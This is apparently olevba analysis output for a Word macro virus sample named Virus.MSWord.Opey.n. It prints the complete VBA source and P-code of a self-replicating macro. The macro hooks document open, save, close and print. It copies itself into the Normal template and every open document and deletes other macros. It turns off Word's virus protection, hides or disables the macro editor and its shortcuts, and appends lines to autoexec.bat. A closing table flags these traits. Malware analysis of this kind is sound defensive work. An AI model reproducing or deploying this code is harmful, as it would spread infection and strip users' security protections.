olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.n
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.n - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CyberHack.vba 
in file: Virus.MSWord.Opey.n - OLE stream: 'Macros/VBA/CyberHack'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Killer_V.bas 
in file: Virus.MSWord.Opey.n - OLE stream: 'Macros/VBA/Killer_V'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub greetings()
    On Error Resume Next
        autoexecfile$ = "c:\autoexec.bat"
        hFile = FreeFile
        line1$ = ""
        line2$ = " Thanks to the Opey Creator. This one is for you! hehehe, hope you like it"
            If ((Month(Date) = 12) And (Day(Date) = 25)) Or ((Month(Date) = 1) And (Day(Date) = 1)) Then
                line1$ = "echo Maligayang Pasko at Manigong bagong taon !!!"
            End If
            If (Month(Date) = 11) And (Day(Date) = 1) Then
                line1$ = "echo Maligayang Araw ng mga Patay !!!"
            End If
            If (Month(Date) = 11) And (Day(Date) = 2) Then
                line1$ = "echo Maligayang Araw ng Kaluluwa at maligayang kaarawan kay a.m. !!!"
            End If
            If (Month(Date) = 9) And (Day(Date) = 22) Then
                line1$ = "echo Maligayang kaarawan kay mama !!!"
            End If
            If (Month(Date) = 9) And (Day(Date) = 20) Then
                line1$ = "echo Maligayang kaarawan kay r.l. !!!"
            End If
            If (Month(Date) = 7) And (Day(Date) = 13) Then
                line1$ = "echo Maligayang kaarawan sa iyo mahal ko - m.v. !!!"
            End If
            If (Month(Date) = 7) And (Day(Date) = 10) Then
                line1$ = "echo Maligayang kaarawan kay marts !!!"
            End If
            If (Month(Date) = 5) And (Day(Date) = 31) Then
                line1$ = "echo Maligayang kaarawan kay papa !!!"
            End If
            If (Month(Date) = 2) And (Day(Date) = 19) Then
                line1$ = "echo Maligayang kaarawan kay winong !!!"
            End If
            If (Month(Date) = 2) And (Day(Date) = 14) Then
                line1$ = "echo Maligayang araw ng mga puso !!!"
            End If
                If line1$ <> "" Then
                    Open autoexecfile$ For Append Access Write As hFile
                        Print #hFile, "@echo off"
                        Print #hFile, line1$
                        Print #hFile, line2$
                        Print #hFile, "echo Mula kay Killer V"
                        Print #hFile, "pause"
                    Close hFile
                End If
End Sub
Sub Hacked()
  On Error Resume Next
    Call Killer_V
    NTInfected = False
        For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(I).Name
                If clan = "Killer_V" Then NTInfected = True
                If (clan <> "Killer_V") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next I
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(j).Name
                    If clan = "Killer_V" Then ODInfected = True
                    If (clan <> "Killer_V") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next j
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="Killer_V", Object:=wdOrganizerObjectProjectItems
                    opendoc.SaveAs FileName:=opendoc.FullName
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Killer_V", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
    Call greetings
End Sub
Sub Killer_V()
    On Error Resume Next
    Application.UserName = "Killer V"
    Application.UserAddress = "PHILIPPINES 99"
    Application.UserInitials = "Killer V"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "Killer V"
        .Title = "SCP - Starcraft Certified Professional"
        .Execute
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CommandBars("Tools").Controls("Customize...").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub FileSave()
    On Error Resume Next
    Call Hacked
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call Hacked
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call Hacked
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    newfile$ = 1
    Call Hacked
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Hacked
End Sub
Sub AutoExec()
    On Error Resume Next
    Call Hacked
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call Hacked
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call Hacked
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call Hacked
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call Hacked
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Opey.n
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1280 bytes
' Macros/VBA/CyberHack - 7257 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' Macros/VBA/Killer_V - 14783 bytes
' Line #0:
' 	FuncDefn (Sub greetings())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	St autoexecfile$ 
' Line #3:
' 	Ld Friend 
' 	St hFile 
' Line #4:
' 	LitStr 0x0000 ""
' 	St line1$ 
' Line #5:
' 	LitStr 0x004A " Thanks to the Opey Creator. This one is for you! hehehe, hope you like it"
' 	St line2$ 
' Line #6:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #7:
' 	LitStr 0x0031 "echo Maligayang Pasko at Manigong bagong taon !!!"
' 	St line1$ 
' Line #8:
' 	EndIfBlock 
' Line #9:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #10:
' 	LitStr 0x0025 "echo Maligayang Araw ng mga Patay !!!"
' 	St line1$ 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #13:
' 	LitStr 0x0044 "echo Maligayang Araw ng Kaluluwa at maligayang kaarawan kay a.m. !!!"
' 	St line1$ 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0016 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #16:
' 	LitStr 0x0025 "echo Maligayang kaarawan kay mama !!!"
' 	St line1$ 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0014 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #19:
' 	LitStr 0x0025 "echo Maligayang kaarawan kay r.l. !!!"
' 	St line1$ 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #22:
' 	LitStr 0x0033 "echo Maligayang kaarawan sa iyo mahal ko - m.v. !!!"
' 	St line1$ 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #25:
' 	LitStr 0x0026 "echo Maligayang kaarawan kay marts !!!"
' 	St line1$ 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001F 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #28:
' 	LitStr 0x0025 "echo Maligayang kaarawan kay papa !!!"
' 	St line1$ 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0013 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #31:
' 	LitStr 0x0027 "echo Maligayang kaarawan kay winong !!!"
' 	St line1$ 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #34:
' 	LitStr 0x0024 "echo Maligayang araw ng mga puso !!!"
' 	St line1$ 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	Ld line1$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #37:
' 	Ld autoexecfile$ 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #38:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #39:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld line1$ 
' 	PrintItemNL 
' Line #40:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld line2$ 
' 	PrintItemNL 
' Line #41:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "echo Mula kay Killer V"
' 	PrintItemNL 
' Line #42:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "pause"
' 	PrintItemNL 
' Line #43:
' 	Ld hFile 
' 	Close 0x0001 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Sub Hacked())
' Line #47:
' 	OnError (Resume Next) 
' Line #48:
' 	ArgsCall (Call) Killer_V 0x0000 
' Line #49:
' 	LitVarSpecial (False)
' 	St NTInfected 
' Line #50:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #51:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #52:
' 	Ld clan 
' 	LitStr 0x0008 "Killer_V"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NTInfected 
' 	EndIf 
' Line #53:
' 	Ld clan 
' 	LitStr 0x0008 "Killer_V"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #54:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #55:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #56:
' 	LitVarSpecial (False)
' 	St ODInfected 
' Line #57:
' 	StartWithExpr 
' 	Ld opendoc 
' 	With 
' Line #58:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #59:
' 	Ld j 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #60:
' 	Ld clan 
' 	LitStr 0x0008 "Killer_V"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ODInfected 
' 	EndIf 
' Line #61:
' 	Ld clan 
' 	LitStr 0x0008 "Killer_V"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld clan 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #62:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #63:
' 	Ld ODInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #64:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "Killer_V"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #65:
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld opendoc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	EndWith 
' Line #68:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	NextVar 
' Line #69:
' 	Ld NTInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #70:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "Killer_V"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #71:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	ArgsCall (Call) greetings 0x0000 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub Killer_V())
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	LitStr 0x0008 "Killer V"
' 	Ld Application 
' 	MemSt UserName 
' Line #78:
' 	LitStr 0x000E "PHILIPPINES 99"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #79:
' 	LitStr 0x0008 "Killer V"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #80:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #81:
' 	LitStr 0x0008 "Killer V"
' 	MemStWith Author 
' Line #82:
' 	LitStr 0x0026 "SCP - Starcraft Certified Professional"
' 	MemStWith Title 
' Line #83:
' 	ArgsMemCallWith Execute 0x0000 
' Line #84:
' 	EndWith 
' Line #85:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #86:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #87:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #88:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #89:
' 	EndWith 
' Line #90:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #91:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #92:
' 	EndWith 
' Line #93:
' 	OnError (Resume Next) 
' Line #94:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #95:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #96:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #97:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #98:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #99:
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #100:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #101:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #102:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #103:
' 	EndSub 
' Line #104:
' 	FuncDefn (Sub FileSave())
' Line #105:
' 	OnError (Resume Next) 
' Line #106:
' 	ArgsCall (Call) Hacked 0x0000 
' Line #107:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #108:
' 	EndSub 
' Line #109:
' 	FuncDefn (Sub FileClose())
' Line #110:
' 	OnError (Resume Next) 
' Line #111:
' 	ArgsCall (Call) Hacked 0x0000 
' Line #112:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #113:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #114:
' 	EndSub 
' Line #115:
' 	FuncDefn (Sub FileExit())
' Line #116:
' 	OnError (Resume Next) 
' Line #117:
' 	ArgsCall (Call) Hacked 0x0000 
' Line #118:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #119:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #120:
' 	EndSub 
' Line #121:
' 	FuncDefn (Sub FileNew())
' Line #122:
' 	OnError (Resume Next) 
' Line #123:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #124:
' 	LitDI2 0x0001 
' 	St newfile$ 
' Line #125:
' 	ArgsCall (Call) Hacked 0x0000 
' Line #126:
' 	EndSub 
' Line #127:
' 	FuncDefn (Sub AutoOpen())
' Line #128:
' 	OnError (Resume Next) 
' Line #129:
' 	ArgsCall (Call) Hacked 0x0000 
' Line #130:
' 	EndSub 
' Line #131:
' 	FuncDefn (Sub AutoExec())
' Line #132:
' 	OnError (Resume Next) 
' Line #133:
' 	ArgsCall (Call) Hacked 0x0000 
' Line #134:
' 	EndSub 
' Line #135:
' 	FuncDefn (Sub FileSaveAs())
' Line #136:
' 	OnError (Resume Next) 
' Line #137:
' 	ArgsCall (Call) Hacked 0x0000 
' Line #138:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #139:
' 	EndSub 
' Line #140:
' 	FuncDefn (Sub FilePageSetup())
' Line #141:
' 	OnError (Resume Next) 
' Line #142:
' 	ArgsCall (Call) Hacked 0x0000 
' Line #143:
' 	Ld wdDialogFilePageSetup 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #144:
' 	EndSub 
' Line #145:
' 	FuncDefn (Sub FilePrint())
' Line #146:
' 	OnError (Resume Next) 
' Line #147:
' 	ArgsCall (Call) Hacked 0x0000 
' Line #148:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #149:
' 	EndSub 
' Line #150:
' 	FuncDefn (Sub FileOpen())
' Line #151:
' 	OnError (Resume Next) 
' Line #152:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #153:
' 	ArgsCall (Call) Hacked 0x0000 
' Line #154:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

